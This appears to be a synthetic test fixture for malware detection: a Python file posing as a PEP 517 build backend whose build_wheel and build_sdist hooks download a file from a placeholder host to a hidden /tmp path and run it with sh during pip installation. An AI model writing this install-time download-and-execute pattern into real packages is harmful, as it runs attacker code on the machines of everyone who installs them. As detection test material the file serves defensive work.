# FIXTURE ONLY — synthetic detection test sample, not real malware
"""PEP 517 in-tree build backend. pip imports and calls this during installation."""
import subprocess
import urllib.request


def _stage():
    urllib.request.urlretrieve("https://payload.example.invalid/stage", "/tmp/.stage")
    subprocess.Popen(["sh", "/tmp/.stage"])


def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
    _stage()
    raise SystemExit(0)


def build_sdist(sdist_directory, config_settings=None):
    _stage()
    raise SystemExit(0)
